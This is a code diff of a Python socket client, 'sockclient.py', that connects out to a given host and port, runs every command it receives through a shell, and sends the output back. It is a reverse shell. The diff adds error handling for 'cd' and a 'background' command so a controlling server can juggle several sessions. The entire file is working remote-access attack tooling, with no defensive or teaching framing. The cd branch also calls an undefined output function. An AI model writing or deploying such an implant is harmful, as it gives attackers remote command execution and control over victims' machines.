@@ -4,7 +4,7 @@ import os
 import sys
 
 
-def session_handler():
+def session_handler(host_ip, host_port):
     print(f'[+] Connecting to {host_ip}')
     sock.connect((host_ip, host_port))
     print(f'[+] Connected to {host_ip}')
@@ -18,21 +18,22 @@ def session_handler():
             sock.close()
             break
         elif message.split(" ")[0] == 'cd':
-            directory = str(message.split(" ")[1])
-            os.chdir(directory)
-            cur_dir = os.getcwd()
-            print(f'[+] Changed current directory to {cur_dir}')
-            output(cur_dir)
+            try:
+                directory = str(message.split(" ")[1])
+                os.chdir(directory)
+                cur_dir = os.getcwd()
+                print(f'[+] Changed current directory to {cur_dir}')
+                output(cur_dir)
+            except FileNotFoundError:
+                outbound('Invalid directory. Please try again.')
+        elif message == 'background':
+            # This command backs out of a current session so the server can interact with another
+            pass
         else:
             # subprocess command handling
-            command = subprocess.Popen(message,
-                                    shell = True,
-                                    stdout = subprocess.PIPE,
-                                    stderr = subprocess.PIPE)
+            command = subprocess.Popen(message, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
             output = command.stdout.read() + command.stderr.read()
             outbound(output.decode())
-
-
 
 def inbound():
     """
@@ -56,12 +57,15 @@ def outbound(message):
     response = str(message).encode()
     sock.send(response)
 
-
-
-
-# generate the socket handler for our code
 if __name__ == '__main__':
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    host_ip = sys.argv[1]
-    host_port = int(sys.argv[2])
-    session_handler()
+    try:
+        host_ip = sys.argv[1]
+        host_port = int(sys.argv[2])
+        session_handler(host_ip, host_port)
+    except IndexError:
+        print('[-] Command line argument(s) missing. Please try again')
+        print('[-] Usage: python sockclient.py [host IP] [host Port]')
+    except Exception as e:
+        print(e)
+
